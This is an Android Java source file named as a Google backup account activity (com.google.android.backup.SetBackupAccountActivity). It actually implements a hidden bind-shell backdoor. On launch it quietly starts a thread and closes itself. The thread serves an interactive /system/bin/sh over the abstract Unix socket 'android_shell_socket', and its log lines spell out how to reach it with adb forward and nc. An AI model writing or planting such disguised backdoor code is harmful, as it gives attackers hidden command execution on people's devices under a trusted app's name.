package com.google.android.backup;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;

import android.net.LocalServerSocket;
import android.net.LocalSocket;

import java.io.InputStream;
import java.io.OutputStream;

public class SetBackupAccountActivity extends Activity {
    private static final String TAG = "ShellSocket";
    private static final String SOCKET_NAME = "android_shell_socket";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // バックグラウンドでソケットサーバーを起動
        startShellServer();

        // アクティビティを即座に終了（サーバースレッドはバックグラウンドで継続）
        finish();
    }

    private void startShellServer() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Unixドメインソケット（抽象名前空間）を開く
                    LocalServerSocket server = new LocalServerSocket(SOCKET_NAME);
                    Log.i(TAG, "Shell socket server started: " + SOCKET_NAME);
                    Log.i(TAG, "Run on Ubuntu: adb forward tcp:8888 localabstract:" + SOCKET_NAME);
                    Log.i(TAG, "Then connect: nc 127.0.0.1 8888");

                    while (true) {
                        try {
                            LocalSocket client = server.accept();
                            Log.i(TAG, "New client connected!");
                            // クライアントごとに新しいシェルスレッドを起動
                            new Thread(new ShellHandler(client)).start();
                        } catch (Exception e) {
                            Log.e(TAG, "Accept error", e);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Failed to start socket server", e);
                }
            }
        }).start();
    }

    // クライアント接続ごとにシェルを提供するハンドラ
    private static class ShellHandler implements Runnable {
        private LocalSocket socket;

        ShellHandler(LocalSocket socket) {
            this.socket = socket;
        }

        @Override
        public void run() {
            Process shell = null;
            try {
                // インタラクティブシェルを起動
                ProcessBuilder builder = new ProcessBuilder("/system/bin/sh");
                builder.redirectErrorStream(true); // stderrをstdoutに統合
                shell = builder.start();

                // ソケットの入出力ストリームを取得
                final InputStream socketIn = socket.getInputStream();
                final OutputStream socketOut = socket.getOutputStream();

                // シェルの入出力ストリームを取得
                final OutputStream shellStdin = shell.getOutputStream();
                final InputStream shellStdout = shell.getInputStream();

                // スレッド1: ソケット → シェル (ユーザー入力 → シェルstdin)
                Thread socketToShell = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = socketIn.read(buffer)) != -1) {
                                shellStdin.write(buffer, 0, len);
                                shellStdin.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                // スレッド2: シェル → ソケット (シェルstdout → クライアント)
                Thread shellToSocket = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = shellStdout.read(buffer)) != -1) {
                                socketOut.write(buffer, 0, len);
                                socketOut.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                socketToShell.start();
                shellToSocket.start();

                // シェルプロセスが終了するのを待つ（またはソケット切断）
                shell.waitFor();
                Log.i(TAG, "Shell process exited");

                // 後始末
                socket.close();
                socketToShell.interrupt();
                shellToSocket.interrupt();

            } catch (Exception e) {
                Log.e(TAG, "Shell handler error", e);
            } finally {
                if (shell != null) {
                    shell.destroy();
                }
                try {
                    socket.close();
                } catch (Exception ignored) {}
            }
        }
    }
}
